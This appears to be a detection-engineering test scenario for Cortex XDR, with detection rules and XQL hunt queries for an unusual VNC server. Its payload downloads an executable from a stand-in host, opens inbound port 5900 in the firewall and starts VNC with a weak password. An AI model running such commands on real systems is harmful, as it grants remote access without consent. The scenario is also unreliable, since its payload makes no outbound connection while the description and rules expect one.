identity.name: Uncommon VNC Server Communication via Windows Endpoint
identity.summary: An attacker installs and executes a VNC server on a Windows endpoint, then establishes a remote connection to a test network IP. Cortex should detect the unusual VNC server process execution and outbo
identity.description: An attacker installs and executes a VNC server on a Windows endpoint, then establishes a remote connection to a test network IP. Cortex should detect the unusual VNC server process execution and outbound network communication.

payload.code:
mkdir C:\temp\vnc
wget https://example.com/vncserver.exe -O C:\temp\vnc\vncserver.exe
stub C:\temp\vnc\vncserver.exe
netsh advfirewall firewall add rule name="Allow VNC" dir=in action=allow protocol=TCP localport=5900
C:\temp\vnc\vncserver.exe --listen 5900 --password secret

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon VNC Server Process Start
biocs.description: Detection of VNC server executable being started on Windows endpoint
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'vncserver.exe'

abiocs.name: Uncommon VNC Server Network Communication
abiocs.description: Detection of outbound network connection from VNC server process to external IP
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECT
| filter action_remote_ip = '192.0.2.1' and dst_port = 5900

xql_queries.name: VNC Server Process Execution Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'vncserver.exe'
| fields actor_process_image_name, action_process_image_name, agent_hostname

xql_queries.name: VNC Server Network Connection Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECT
| filter dst_port = 5900 and action_remote_ip = '192.0.2.1'
| fields dst_ip, dst_port, action_remote_ip, agent_hostname
